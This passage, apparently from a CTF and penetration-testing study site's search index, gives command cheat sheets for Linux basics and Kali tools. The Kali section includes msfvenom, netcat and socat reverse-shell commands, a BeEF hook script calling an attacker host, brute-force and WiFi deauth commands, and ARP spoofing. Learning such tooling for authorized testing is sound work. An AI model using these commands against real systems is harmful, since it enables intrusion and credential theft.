scp file.txt user@192.168.1.10:/home/user/\n#Copies \"file.txt\" to Remote Host's /home/user/ Directory Using SSH\n</code></pre> <p>SSH Basics</p> <ul> <li>Default SSH port is 22, but admins may change it.  </li> <li>Keys (<code>id_rsa</code>, <code>id_ed25519</code>) are more secure than passwords.  </li> <li><code>scp</code> (secure copy) uses SSH to transfer files.  </li> <li>Misconfigured SSH can be a major security risk in CTFs and real life.</li> </ul>"},{"location":"Linux%20Basics/21%20-%20SSH%20Basics/#ssh-basics-commands","title":"SSH Basics Commands","text":""},{"location":"Linux%20Basics/22%20-%20Services/","title":"22   Services","text":""},{"location":"Linux%20Basics/22%20-%20Services/#purpose","title":"Purpose","text":"<p>Services are background processes that start at boot and provide functionality like web servers, databases, or SSH. In CTFs, understanding services is key to finding attack vectors. In the real world, sysadmins and penetration testers manage services to keep systems secure and running properly.</p>"},{"location":"Linux%20Basics/22%20-%20Services/#core-commands","title":"Core Commands","text":"<pre><code>$ systemctl status ssh\n#Checks Status of \"ssh\" Service\n\n$ systemctl start apache2\n#Starts \"apache2\" Web Server Service\n\n$ systemctl stop apache2\n#Stops \"apache2\" Web Server Service\n\n$ systemctl enable apache2\n#Enables \"apache2\" to Start at Boot\n\n$ service apache2 restart\n#Restarts \"apache2\" Service (Older Syntax)\n</code></pre> <p>Services Basics</p> <ul> <li><code>systemctl</code> is the modern command for managing services (systemd).  </li> <li><code>service</code> is legacy but still works on many systems.  </li> <li>Services are critical attack points in CTFs (e.g., misconfigured Apache, MySQL).  </li> <li>Always check what services are running on a target system.</li> </ul>"},{"location":"Linux%20Basics/22%20-%20Services/#services-commands","title":"Services Commands","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/","title":"Kali Tools","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#01-information-gathering","title":"01 - Information Gathering","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#dnsenum","title":"DNSenum","text":"<ul> <li><code>dnsenum &lt;domain&gt;</code> \u2192 basic DNS info (NS, MX, SOA, subdomains)</li> <li><code>dnsenum -f &lt;wordlist&gt; &lt;domain&gt;</code> \u2192 brute-force subdomains with a wordlist</li> <li><code>dnsenum --dnsserver &lt;dns&gt; &lt;domain&gt;</code> \u2192 query using a specific DNS server</li> <li><code>dnsenum -o &lt;prefix&gt; &lt;domain&gt;</code> \u2192 save results with file prefix</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#gobuster","title":"Gobuster","text":"<ul> <li><code>gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;</code> \u2192 find hidden web directories</li> <li><code>gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt; -x .php,.txt</code> \u2192 try common extensions</li> <li><code>gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt;</code> \u2192 brute-force subdomains</li> <li><code>gobuster vhost -u &lt;url&gt; -w &lt;wordlist&gt;</code> \u2192 brute-force virtual hosts</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#nmap","title":"Nmap","text":"<ul> <li><code>nmap -T4 -F &lt;target&gt;</code> \u2192 quick scan (common ports)</li> <li><code>sudo nmap -sS -sV -sC -O -p- &lt;target&gt;</code> \u2192 full scan (version, scripts, OS)</li> <li><code>sudo nmap -sU -p &lt;ports&gt; &lt;target&gt;</code> \u2192 UDP scan of chosen ports</li> <li><code>nmap -oA &lt;prefix&gt; &lt;target&gt;</code> \u2192 save results in all formats</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#recon-ng","title":"Recon-ng","text":"<ul> <li><code>recon-ng</code> \u2192 start the framework</li> <li><code>workspaces create &lt;name&gt;</code> \u2192 create a workspace for your target</li> <li><code>modules load &lt;module&gt;</code> \u2192 load a recon module</li> <li><code>options set SOURCE &lt;domain&gt;</code> \u2192 set the target for the module</li> <li><code>run</code> \u2192 execute the module</li> <li><code>show hosts</code> \u2192 list discovered hosts</li> <li><code>export csv &lt;file&gt;</code> \u2192 export results</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#whatweb","title":"WhatWeb","text":"<ul> <li><code>whatweb &lt;url&gt;</code> \u2192 quick fingerprint of site tech</li> <li><code>whatweb -a 3 &lt;url&gt;</code> \u2192 more aggressive detection</li> <li><code>whatweb -v &lt;url&gt; -o &lt;file&gt;</code> \u2192 verbose output and save to file</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#whois","title":"WHOIS","text":"<ul> <li><code>whois &lt;domain&gt;</code> \u2192 domain registration info</li> <li><code>whois &lt;ip&gt;</code> \u2192 IP ownership/allocation info</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#02-vulnerability-analysis","title":"02 - Vulnerability Analysis","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#lynis","title":"Lynis","text":"<ul> <li><code>sudo lynis audit system</code> \u2192 run a full system security audit</li> <li><code>lynis show tests</code> \u2192 list available test categories</li> <li><code>sudo lynis update info</code> \u2192 update lynis data/plugins</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#nikto","title":"Nikto","text":"<ul> <li><code>nikto -h http://&lt;target&gt;</code> \u2192 basic webserver scan for common issues</li> <li><code>nikto -h https://&lt;target&gt; -o nikto.xml -Format xml</code> \u2192 save XML report</li> <li><code>nikto -h &lt;target&gt; -Tuning 2</code> \u2192 limit tuning category to reduce checks</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#openvas","title":"OpenVas","text":"<ul> <li><code>sudo systemctl status gvm</code> \u2192 check GVM/OpenVAS service status</li> <li><code>sudo gvm-feed-update</code> \u2192 update vulnerability feeds (may vary by install)</li> <li>(Use the web UI at https://localhost:9392) \u2192 create target, create task, run scan</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#wpscan","title":"WPScan","text":"<ul> <li><code>wpscan --url http://&lt;target&gt; --enumerate u</code> \u2192 enumerate users</li> <li><code>wpscan --url https://&lt;target&gt; --enumerate p,t --api-token &lt;token&gt;</code> \u2192 enumerate plugins &amp; themes with API token</li> <li><code>wpscan --url &lt;target&gt; -o wpscan-report.txt</code> \u2192 save report to file</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#03-web-exploitation","title":"03 - Web Exploitation","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#burp-suite","title":"Burp Suite","text":"<ul> <li><code>burpsuite</code> \u2192 launch Burp GUI and configure browser proxy (127.0.0.1:8080)</li> <li>Use Proxy \u2192 intercept requests, send to Repeater to modify and resend</li> <li>Use Intruder \u2192 automate payloads/fuzzing (Pro has extra features)</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#commix","title":"Commix","text":"<ul> <li><code>commix -u \"http://&lt;target&gt;/vuln.php?cmd=test\"</code> \u2192 test for command injection</li> <li><code>commix -u \"&lt;url&gt;\" --os-cmd=\"id\"</code> \u2192 run a single OS command</li> <li><code>commix --proxy=http://127.0.0.1:8080</code> \u2192 route through Burp for inspection</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#sqlmap","title":"SQLmap","text":"<ul> <li><code>sqlmap -u \"http://&lt;target&gt;/page.php?id=1\" --batch</code> \u2192 basic automated SQLi test</li> <li><code>sqlmap -r request.txt --dbs</code> \u2192 use Burp request file to enumerate DBs</li> <li><code>sqlmap -u \"&lt;url&gt;\" --dump -D &lt;db&gt; -T &lt;table&gt;</code> \u2192 dump table data</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#zaproxy","title":"ZAProxy","text":"<ul> <li><code>owasp-zap</code> \u2192 launch ZAP GUI and configure browser proxy (127.0.0.1:8080)</li> <li><code>zap.sh -daemon -port 8080</code> \u2192 start ZAP in headless mode (use API)</li> <li>Use Active Scanner \u2192 run automated active tests (authorized targets only)</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#04-password-attacks","title":"04 - Password Attacks","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#cewl","title":"Cewl","text":"<ul> <li><code>cewl &lt;url&gt; -w &lt;file&gt;</code> \u2192 crawl site and save wordlist</li> <li><code>cewl -d 2 -m 5 -c &lt;url&gt; -w &lt;file&gt;</code> \u2192 depth 2, min length 5, count &amp; save</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#hashcat","title":"Hashcat","text":"<ul> <li><code>hashcat -m &lt;mode&gt; -a 0 hashes.txt rockyou.txt -o cracked.txt</code> \u2192 dictionary attack</li> <li><code>hashcat -m &lt;mode&gt; -a 3 hashes.txt ?l?l?l?l?l?l</code> \u2192 brute-force mask</li> <li><code>hashcat -m &lt;mode&gt; -a 6 hashes.txt rockyou.txt ?d?d</code> \u2192 hybrid (wordlist + mask)</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#hydra","title":"Hydra","text":"<ul> <li><code>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://&lt;host&gt; -t 4 -f</code> \u2192 SSH brute-force for single user</li> <li><code>hydra -L users.txt -P passwords.txt ftp://&lt;host&gt; -t 6</code> \u2192 FTP with userlist &amp; passlist</li> <li><code>hydra -l admin -P passwords.txt &lt;host&gt; http-form-post \"/login.php:username=^USER^&amp;password=^PASS^:F=incorrect\"</code> \u2192 HTTP form example</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#john","title":"John","text":"<ul> <li><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code> \u2192 wordlist attack</li> <li><code>john --show hashes.txt</code> \u2192 display cracked passwords</li> <li><code>john --incremental hashes.txt</code> \u2192 incremental brute-force</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#medusa","title":"Medusa","text":"<ul> <li><code>medusa -h &lt;host&gt; -U users.txt -P passwords.txt -M ssh -t 8 -f</code> \u2192 SSH brute-force</li> <li><code>medusa -h &lt;host&gt; -U users.txt -P passwords.txt -M ftp</code> \u2192 FTP brute-force</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#05-wireless-attacks","title":"05 - Wireless Attacks","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#aircrack-ng","title":"Aircrack-ng","text":"<ul> <li><code>airmon-ng check kill</code> \u2192 stop interfering services before monitor mode</li> <li><code>airmon-ng start &lt;iface&gt;</code> \u2192 enable monitor mode (creates mon0 or wlan0mon)</li> <li><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;prefix&gt; &lt;mon_iface&gt;</code> \u2192 capture packets/handshake</li> <li><code>aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;client&gt; &lt;mon_iface&gt;</code> \u2192 deauth client to force handshake</li> <li><code>aircrack-ng -w &lt;wordlist&gt; -b &lt;BSSID&gt; &lt;capture&gt;.cap</code> \u2192 crack handshake with wordlist</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#kismet","title":"Kismet","text":"<ul> <li><code>sudo kismet</code> \u2192 launch Kismet server and web UI (http://127.0.0.1:2501)</li> <li><code>sudo kismet -c wifi:mon0:name=mon0</code> \u2192 start with specific source</li> <li>Export pcaps via UI or kismet.conf for later analysis</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#reaver","title":"Reaver","text":"<ul> <li><code>sudo reaver -i mon0 -b &lt;BSSID&gt; -c &lt;channel&gt; -vv</code> \u2192 brute-force WPS PIN</li> <li><code>sudo reaver -i mon0 -b &lt;BSSID&gt; -c &lt;channel&gt; -K 1 -vv</code> \u2192 try pixie-dust attack (if supported)</li> <li><code>--mac=&lt;mac&gt;</code> \u2192 spoof MAC to avoid rate-limits or blocks</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#wifite","title":"Wifite","text":"<ul> <li><code>sudo wifite</code> \u2192 interactive scan and attack menu for nearby APs</li> <li><code>sudo wifite --kill --wps --crack --dict /path/to/rockyou.txt -i mon0</code> \u2192 non-interactive WPS + handshake capture + cracking</li> <li><code>--kill</code> \u2192 stops NetworkManager/wpa_supplicant while running</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#06-reverse-engineering","title":"06 - Reverse Engineering","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#edb-debugger","title":"Edb-debugger","text":"<ul> <li><code>edb ./binary</code> \u2192 open binary in Edb GUI for visual debugging</li> <li><code>edb -p &lt;pid&gt;</code> \u2192 attach to running process</li> <li>Use breakpoints (click) and step (F7/F8) to inspect registers/memory</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#gdb","title":"Gdb","text":"<ul> <li><code>gdb ./binary</code> \u2192 start gdb with binary</li> <li><code>gdb -p &lt;pid&gt;</code> \u2192 attach to running process</li> <li><code>break main</code> / <code>run &lt;args&gt;</code> / <code>info registers</code> / <code>x/32xb $rsp</code> \u2192 common workflow</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#jadx","title":"Jadx","text":"<ul> <li><code>jadx-gui app.apk</code> \u2192 open APK in GUI and browse decompiled Java</li> <li><code>jadx -d out app.apk</code> \u2192 decompile APK to folder <code>out/</code></li> <li><code>grep -R \"KEY\" out/</code> \u2192 search decompiled sources for strings</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#radare2","title":"Radare2","text":"<ul> <li><code>r2 -A ./binary</code> \u2192 open and auto-analyze binary</li> <li><code>afl</code> \u2192 list functions</li> <li><code>pdf @ sym.main</code> \u2192 print disassembly of <code>main</code></li> <li><code>VV</code> \u2192 visual mode (interactive disassembly)</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#07-exploitation-tools","title":"07 - Exploitation Tools","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#beef-xss","title":"Beef-xss","text":"<ul> <li><code>beef-xss</code> \u2192 start BeEF UI (http://127.0.0.1:3000/ui/panel)</li> <li>Hook with <code>&lt;script src=\"http://&lt;attacker&gt;:3000/hook.js\"&gt;&lt;/script&gt;</code> \u2192 inject into vulnerable page</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#metasploit","title":"Metasploit","text":"<ul> <li><code>msfconsole</code> \u2192 start Metasploit console</li> <li><code>search &lt;keyword&gt;</code> \u2192 find module</li> <li><code>use exploit/...</code> / <code>set RHOSTS &lt;ip&gt;</code> / <code>exploit</code> \u2192 run exploit</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#msfvenom","title":"Msfvenom","text":"<ul> <li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o shell.exe</code> \u2192 Windows reverse shell exe</li> <li><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf -o shell.elf</code> \u2192 Linux reverse shell ELF</li> <li><code>msfvenom -p ... -f c</code> \u2192 output C-style shellcode</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#searchsploit","title":"Searchsploit","text":"<ul> <li><code>searchsploit &lt;keyword&gt;</code> \u2192 search Exploit-DB offline</li> <li><code>searchsploit -m &lt;id&gt;</code> \u2192 copy exploit to current directory</li> <li><code>searchsploit -x &lt;id&gt;</code> \u2192 open exploit in editor</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#08-sniffing-spoofing","title":"08 - Sniffing &amp; Spoofing","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#bettercap","title":"Bettercap","text":"<ul> <li><code>bettercap -iface &lt;iface&gt;</code> \u2192 start Bettercap on an interface</li> <li><code>net.probe on</code> / <code>net.recon on</code> \u2192 discover hosts</li> <li><code>arp.spoof on</code> / <code>net.sniff on</code> \u2192 perform ARP MITM and sniff traffic</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#ettercap","title":"Ettercap","text":"<ul> <li><code>ettercap -T -M arp:remote /&lt;target1&gt;/ /&lt;target2&gt;/</code> \u2192 ARP MITM between two hosts</li> <li><code>ettercap -G</code> \u2192 launch GUI mode</li> <li>Use plugins like <code>dns_spoof</code> for DNS hijacking</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#tcpdump","title":"TCPdump","text":"<ul> <li><code>tcpdump -i eth0 -nn -c 10</code> \u2192 capture 10 packets</li> <li><code>tcpdump -i eth0 port 80 -A</code> \u2192 capture and show HTTP traffic</li> <li><code>tcpdump -i wlan0 -w capture.pcap</code> \u2192 save to file for Wireshark</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#wireshark","title":"Wireshark","text":"<ul> <li><code>wireshark</code> \u2192 launch GUI analyzer</li> <li>Display filters: <code>http</code>, <code>ip.addr == &lt;ip&gt;</code>, <code>tcp.port == 21</code></li> <li>Right-click packet \u2192 Follow TCP Stream \u2192 reconstruct conversation</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#09-maintaining-access","title":"09 - Maintaining Access","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#netcat","title":"Netcat","text":"<ul> <li><code>nc -lvnp 4444</code> \u2192 listener on port 4444</li> <li><code>nc &lt;ip&gt; 4444 -e /bin/bash</code> \u2192 reverse shell to listener</li> <li><code>nc -l -p 1234 &lt; file.txt</code> / <code>nc &lt;ip&gt; 1234 &gt; file.txt</code> \u2192 file transfer</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#socat","title":"Socat","text":"<ul> <li><code>socat tcp-connect:&lt;ip&gt;:&lt;port&gt; exec:/bin/bash,pty,stderr,sigint,setsid,sane</code> \u2192 reverse shell</li> <li>Listener: <code>socat file:\\</code>tty`,raw,echo=0 tcp-listen:4444<code>Victim:</code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp::4444` \u2192 stable shell upgrade <li><code>socat tcp-listen:8080,reuseaddr,fork tcp:&lt;target&gt;:80</code> \u2192 port forward</li>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#ssh","title":"SSH","text":"<ul> <li><code>ssh user@&lt;ip&gt;</code> \u2192 basic login</li> <li><code>ssh -i id_rsa user@&lt;ip&gt;</code> \u2192 login with private key</li> <li><code>ssh -L 8080:localhost:3306 user@&lt;ip&gt;</code> \u2192 local port forward</li> <li><code>ssh -D 1080 user@&lt;ip&gt;</code> \u2192 dynamic SOCKS proxy</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#10-digital-forensics","title":"10 - Digital Forensics","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#autopsy","title":"Autopsy","text":"<ul> <li><code>autopsy</code> \u2192 launch Autopsy server and open browser UI (http://127.0.0.1:9999)</li> <li>Create case -&gt; Add data source (image.dd) -&gt; run ingest modules (timeline, keyword, file type)</li> <li>Export HTML/PDF report from GUI</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#binwalk","title":"Binwalk","text":"<ul> <li><code>binwalk firmware.bin</code> \u2192 scan for embedded files and signatures</li> <li><code>binwalk -e firmware.bin</code> \u2192 auto-extract embedded files to _firmware.bin.extracted/</li> <li><code>grep -R \"flag{\" _firmware.bin.extracted/</code> \u2192 search extracted content for flags</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#sleuthkit","title":"Sleuthkit","text":"<ul> <li><code>mmls image.dd</code> \u2192 show partition layout and offsets</li> <li><code>fls -r -m / image.dd</code> \u2192 list files (including deleted)</li> <li><code>icat image.dd &lt;inode&gt; &gt; recovered_file</code> \u2192 extract file by inode</li> <li><code>tsk_recover image.dd output_dir/</code> \u2192 recover many files</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#volatility","title":"Volatility","text":"<ul> <li><code>vol.py -f memory.dmp --profile=&lt;profile&gt; pslist</code> \u2192 (Vol2) list processes</li> <li><code>vol -f memory.raw linux.pslist</code> \u2192 (Vol3) list processes</li> <li><code>vol -f memory.raw linux.lsof</code> / <code>netscan</code> \u2192 list connections and open files</li> <li><code>strings memory.raw | grep -i password</code> \u2192 quick memory string search</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#11-reporting","title":"11 - Reporting","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#dradis","title":"Dradis","text":"<ul> <li><code>docker run --rm -p 3000:3000 dradis/dradis-ce</code> \u2192 quick Dradis server (Docker)</li> <li>Use web UI to create project, import Nmap/Nessus/Burp outputs, add findings, export HTML/PDF</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#faraday","title":"Faraday","text":"<ul> <li><code>docker-compose up -d</code> \u2192 start Faraday server/client stack (depends on your compose file)</li> <li><code>faraday-import nmap -f nmap.xml -w myworkspace</code> \u2192 import Nmap into workspace (CLI helper name may vary)</li> <li>Use web UI to tag findings, add notes, and export reports</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#maltego","title":"Maltego","text":"<ul> <li>Launch GUI -&gt; New Graph -&gt; add seed entities (domain/email/IP) -&gt; run transforms</li> <li>Add API keys (Shodan, VirusTotal) in settings to enable advanced transforms</li> <li>Export graph -&gt; PNG/CSV for reporting</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#12-other","title":"12 - Other","text":""},{"location":"Master%20Command%20Sheets/Kali%20Tools/#exiftool","title":"Exiftool","text":"<ul> <li><code>exiftool &lt;file&gt;</code> \u2192 show metadata for images/docs</li> <li><code>exiftool -a -u -g1 &lt;file&gt;</code> \u2192 show all tags including unknown/custom tags</li> <li><code>exiftool -csv -all &lt;file&gt;</code> \u2192 export metadata as CSV</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#steghide","title":"Steghide","text":"<ul> <li><code>steghide info &lt;file&gt;</code> \u2192 check if file contains embedded data</li> <li><code>steghide extract -sf &lt;file&gt; -xf &lt;out&gt;</code> \u2192 extract embedded file (prompts for passphrase)</li> <li><code>steghide embed -cf &lt;cover&gt; -ef &lt;secret&gt; -sf &lt;out&gt;</code> \u2192 embed secret into cover (prompts for passphrase)</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#stegseek","title":"Stegseek","text":"<ul> <li><code>stegseek &lt;stego-file&gt; &lt;wordlist&gt; &lt;output&gt;</code> \u2192 brute-force stego passphrase with wordlist</li> <li>Use targeted wordlists (Cewl output or rockyou) for better success</li> </ul>"},{"location":"Master%20Command%20Sheets/Kali%20Tools/#strings","title":"Strings","text":"<ul> <li><code>strings &lt;file&gt;</code> \u2192 print printable strings (min length 4)</li> <li><code>strings -n 6 &lt;file&gt;</code> \u2192 set min length to 6 to reduce noise</li> <li><code>strings -t x &lt;file&gt; | grep -i password</code> \u2192 show hex offsets and search for \"password\"</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/","title":"Linux Basics","text":""},{"location":"Master%20Command%20Sheets/Linux%20Basics/#01-file-navigation","title":"01 - File Navigation","text":"<ul> <li><code>$ pwd</code> -&gt; prints current path</li> <li><code>$ ls</code> -&gt; prints non-hidden directory contents</li> <li><code>$ ls -l</code> -&gt; prints non-hidden directory contents + more info</li> <li><code>$ cd &lt;dir name&gt;</code> -&gt; changes current directory to <code>&lt;dir name&gt;</code></li> <li><code>$ cd ..</code> -&gt; changes current directory to one directory higher</li> <li><code>$ cd ~</code> -&gt; changes current directory to home directory</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#02-hidden-files","title":"02 - Hidden Files","text":"<ul> <li><code>$ ls -a</code> -&gt; prints non-hidden and hidden directory contents</li> <li><code>$ ls -la</code> -&gt; prints non-hidden and hidden directory contents + more info</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#03-file-operations","title":"03 - File Operations","text":"<ul> <li><code>$ mkdir &lt;dir name&gt;</code> -&gt; creates directory <code>&lt;dir name&gt;</code></li> <li><code>$ touch &lt;file name&gt;</code> -&gt; creates file <code>&lt;file name&gt;</code></li> <li><code>$ mv &lt;file name&gt; &lt;new path&gt;</code> -&gt; moves file <code>&lt;file name&gt;</code> into <code>&lt;new path&gt;</code></li> <li><code>$ mv &lt;file name&gt; &lt;new file name&gt;</code> -&gt; renames file <code>&lt;file name&gt;</code> to <code>&lt;new file name&gt;</code></li> <li><code>$ cp &lt;file name&gt; &lt;copy name&gt;</code> -&gt; copies <code>&lt;file name&gt;</code> into <code>&lt;copy name&gt;</code> (same contents, 2 files now)</li> <li><code>$ cp -r &lt;dir name&gt; &lt;copy name&gt;</code> -&gt; copies directory <code>&lt;dir name&gt;</code> and its contents into <code>&lt;copy name&gt;</code></li> <li><code>$ rm &lt;file name&gt;</code> -&gt; deletes <code>&lt;file name&gt;</code></li> <li><code>$ rm -r &lt;dir name&gt;</code> -&gt; deletes directory <code>&lt;dir name&gt;</code> and its contents</li> <li><code>$ rmdir &lt;dir name&gt;</code> -&gt; deletes empty directory <code>&lt;dir name&gt;</code></li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#04-viewing-files","title":"04 - Viewing Files","text":"<ul> <li><code>$ cat &lt;file&gt;</code> -&gt; prints entire contents of <code>&lt;file&gt;</code></li> <li><code>$ less &lt;file&gt;</code> -&gt; opens <code>&lt;file&gt;</code> in scrollable pager (arrow keys, <code>q</code> to quit)</li> <li><code>$ head &lt;file&gt;</code> -&gt; prints first 10 lines of <code>&lt;file&gt;</code></li> <li><code>$ head -n &lt;num&gt; &lt;file&gt;</code> -&gt; prints first <code>&lt;num&gt;</code> lines of <code>&lt;file&gt;</code></li> <li><code>$ tail &lt;file&gt;</code> -&gt; prints last 10 lines of <code>&lt;file&gt;</code></li> <li><code>$ tail -n &lt;num&gt; &lt;file&gt;</code> -&gt; prints last <code>&lt;num&gt;</code> lines of <code>&lt;file&gt;</code></li> <li><code>$ tail -f &lt;file&gt;</code> -&gt; prints and follows changes in <code>&lt;file&gt;</code> in real time</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#05-searching-files","title":"05 - Searching Files","text":"<ul> <li><code>$ find &lt;path&gt; -name &lt;pattern&gt;</code> -&gt; searches <code>&lt;path&gt;</code> for files matching <code>&lt;pattern&gt;</code></li> <li><code>$ find &lt;path&gt; -type f</code> -&gt; lists all files in <code>&lt;path&gt;</code></li> <li><code>$ find &lt;path&gt; -type d</code> -&gt; lists all directories in <code>&lt;path&gt;</code></li> <li><code>$ locate &lt;filename&gt;</code> -&gt; quickly finds paths containing <code>&lt;filename&gt;</code></li> <li><code>$ grep &lt;pattern&gt; &lt;file&gt;</code> -&gt; prints lines in <code>&lt;file&gt;</code> containing <code>&lt;pattern&gt;</code></li> <li><code>$ grep -r &lt;pattern&gt; &lt;dir&gt;</code> -&gt; searches all files in <code>&lt;dir&gt;</code> for <code>&lt;pattern&gt;</code></li> <li><code>$ grep -i &lt;pattern&gt; &lt;file&gt;</code> -&gt; searches <code>&lt;file&gt;</code> ignoring case</li> <li><code>$ which &lt;command&gt;</code> -&gt; shows path of <code>&lt;command&gt;</code> if installed</li> <li><code>$ whereis &lt;command&gt;</code> -&gt; shows all locations of <code>&lt;command&gt;</code> (binary, source, man page)</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#06-file-permissions","title":"06 - File Permissions","text":"<ul> <li><code>$ ls -l</code> -&gt; shows permissions, owner, group, and file info</li> <li><code>$ chmod &lt;mode&gt; &lt;file&gt;</code> -&gt; changes file permissions (e.g., <code>755</code> or <code>+x</code>)</li> <li><code>$ chown &lt;user&gt;:&lt;group&gt; &lt;file&gt;</code> -&gt; changes ownership of file</li> <li><code>$ groups</code> -&gt; shows groups the current user belongs to</li> <li><code>$ umask</code> -&gt; shows default permission mask for new files</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#07-users-and-groups","title":"07 - Users and Groups","text":"<ul> <li><code>$ whoami</code> -&gt; prints current logged-in user</li> <li><code>$ id</code> -&gt; shows user ID, group ID, and memberships</li> <li><code>$ su &lt;user&gt;</code> -&gt; switch to another user account</li> <li><code>$ sudo &lt;command&gt;</code> -&gt; run command with root privileges</li> <li><code>$ adduser &lt;username&gt;</code> -&gt; create new user</li> <li><code>$ cat /etc/passwd</code> -&gt; shows user account info</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#08-processes","title":"08 - Processes","text":"<ul> <li><code>$ ps</code> -&gt; shows running processes for current shell</li> <li><code>$ ps aux</code> -&gt; shows all running processes with details</li> <li><code>$ top</code> -&gt; real-time interactive process monitor</li> <li><code>$ htop</code> -&gt; user-friendly interactive process monitor</li> <li><code>$ kill &lt;PID&gt;</code> -&gt; kills process with given PID</li> <li><code>$ jobs</code> -&gt; lists background jobs in shell</li> <li><code>&lt;command&gt; &amp;</code> -&gt; runs command in background</li> <li><code>$ fg %&lt;job&gt;</code> -&gt; brings background job to foreground</li> <li><code>$ bg %&lt;job&gt;</code> -&gt; resumes job in background</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#09-system-info","title":"09 - System Info","text":"<ul> <li><code>$ uname -a</code> -&gt; prints kernel name, version, machine, and system info</li> <li><code>$ hostname</code> -&gt; prints the system\u2019s hostname</li> <li><code>$ uptime</code> -&gt; shows system uptime, logged-in users, and load averages</li> <li><code>$ df -h</code> -&gt; shows disk space usage (human-readable)</li> <li><code>$ free -m</code> -&gt; shows memory usage in MB</li> </ul>"},{"location":"Master%20Command%20Sheets/Linux%20Basics/#10-networking-basics","title":"10 - Networking Basics","text":"<ul> <li><code>$ ifconfig</code> -&gt; shows network interfaces and IP addresses (legacy)</li> <li><code>$ ip a</code> -&gt; shows network interfaces and IP addresses (modern)</li> <li><code>$ ping &lt;host&gt;</code> -&gt; tests connectivity to <code>&lt;host&gt;</code></li> <li><code>$ netstat 